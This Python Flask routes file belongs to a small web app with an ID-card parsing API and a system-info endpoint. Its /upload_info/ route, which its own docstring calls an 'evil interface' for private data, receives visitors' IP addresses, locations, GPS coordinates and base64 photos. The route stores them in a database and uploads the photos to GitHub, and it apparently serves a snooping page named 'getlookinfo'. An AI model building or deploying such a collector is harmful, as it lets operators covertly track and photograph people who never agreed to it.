#!/usr/bin/python python3
# coding=utf-8
'''
Author: whalefall
Date: 2021-09-20 11:47:04
LastEditTime: 2021-09-20 11:52:59
Description: 主蓝本的路由-由 app.py 迁徙过来
'''
from . import main
from flask import render_template
from ..utils.sysinfo import sysinfo
from ..utils.func import *
from ..utils.parse_idcard import parseID
from ..utils.uploadGithub import save_base64_pic
from ..models import Log, db


@main.route('/')
def index():
    """主页"""
    return render_template('index.html')


@main.route('/sysinfo/', methods=["GET"])
@dontreturn
def _():
    """获取系统信息返回"""
    return resp_parse(sysinfo())


@main.route('/sfz/', methods=['GET'])
def _sfz():
    """身份证解析"""
    return render_template('sfz.html')


@main.route('/sfz/api/', methods=['GET', 'POST'])
@dontreturn
def parse_id_card():
    """解析身份证API,纯utils.parse_idcard实现"""
    req = request_parse(request)
    idcard = req.get('idcard')
    if not idcard:
        return resp_parse(BaseResp(code=501, msg="请传入请求参数idcard"))
    try:
        r = parseID(idcard)
    except Exception as e:
        return resp_parse(BaseResp(code=501, msg=f"解析身份证[{idcard}]出现问题{e},请检查身份证格式!"))
    else:
        return resp_parse(BaseResp(code=200, msg=f"身份证[{idcard}]解析成功!", data=r.dict()))


@main.route('/getlookinfo/', methods=['GET'])
def get_index():
    """测试获取信息"""
    return render_template('getlookinfo.html')


@main.route('/upload_info/', methods=['POST', 'GET'])
@dontreturn
def upload_info():
    '''上传各种隐私数据并传入数据库的邪恶接口
    传入参数:
    {ip:{ip,where},gps:{x(经度),y(纬度)},base64:base64图片}
    '''

    upload_data = request.get_json()
    # 设置默认值防止部分数据为空

    i = Log(
        ip=upload_data.get('ip', {'ip': None, 'where': None}).get('ip'),
        ip_addr=upload_data.get('ip', {'ip': None, 'where': None}).get('where'),
        gps_addr="%s,%s" % (upload_data.get('gps', {'x': None, 'y': None}).get(
            'x'), upload_data.get('gps', {'x': None, 'y': None}).get('y')),
        base64_pic=upload_data.get('base64')
    )
    db.session.add(i)
    db.session.commit()

    if i.base64_pic:
        try:
            save_base64_pic(i.base64_pic, file_name=i.timestamp)
            print('图片写入成功')
        except:
            pass

    return resp_parse(BaseResp(msg='upload suc'))
